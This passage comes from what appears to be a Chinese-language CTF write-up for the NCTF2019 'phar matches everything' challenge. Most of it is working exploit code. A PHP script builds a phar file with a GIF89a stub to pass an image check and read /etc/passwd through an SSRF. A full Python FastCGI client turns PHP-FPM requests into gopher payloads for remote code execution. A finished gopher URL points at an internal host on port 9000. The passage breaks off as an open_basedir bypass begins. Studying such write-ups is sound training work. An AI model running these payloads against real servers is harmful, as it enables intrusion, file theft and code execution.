&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要绕过getimagesize的验证，加上GIF89a，这里还要让Easytest类中的$test===‘1’，然后就可以利用curl来读取文件内容</p><p>下面就是写一个phar反序列化的exp来验证一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $test = <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $url =<span class="string">'file:///etc/passwd'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span> . <span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>这里直接对序列化的数据进行url编码，经过测试需要编码</p><p>将本地生成的phar文件后缀修改成gif，上传，然后访问</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/1.png" class=""><p>不知道是怎么看出打内网的，先跟着继续</p><p>改变url读取/etc/hosts</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/2.png" class=""><p>成功读取到了一台主机地址173.111.147.10</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/3.png" class=""><p>用http协议访问一下该网址，发现就是这个页面</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/4.png" class=""><p>根据之前buu做题经验，应该是下一台173.111.147.11，访问一下</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/5.png" class=""><p>果然是这样，还有提示是跟PHP-FPM相关，下面就是ssrf+gopher打fpm，先来看一下phpinfo();,下面是生成TCP数据流的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    print(<span class="string">"gopher://127.0.0.1:"</span> + str(args.port) + <span class="string">"/_"</span> + response)</span><br></pre></td></tr></table></figure><p>上面脚本来自<a href="https://evoa.me/archives/6/#PHP-FPM" target="_blank" rel="noopener">https://evoa.me/archives/6/#PHP-FPM</a> evoa师傅的博客</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $url=<span class="string">"gopher://173.111.147.11:9000/_%01%01%D7%96%00%08%00%00%00%01%00%00%00%00%00%00%01%04%D7%96%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%D7%96%00%00%00%00%01%05%D7%96%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%D7%96%00%00%00%00"</span>;</span><br><span class="line">&#125;</span><br><span class="line">    @unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">    $obj = <span class="keyword">new</span> Main;</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($obj);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><img src="/2020/07/30/NCTF2019-phar-matches-everything/6.png" class=""><p>可以看到成功访问到了phpinfo页面，看到了绝大多数系统命令执行函数被ban，发现<code>open_basedir：**/var/www/html:/tmp**</code></p><p>下面就是套绕过open_basedir的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php 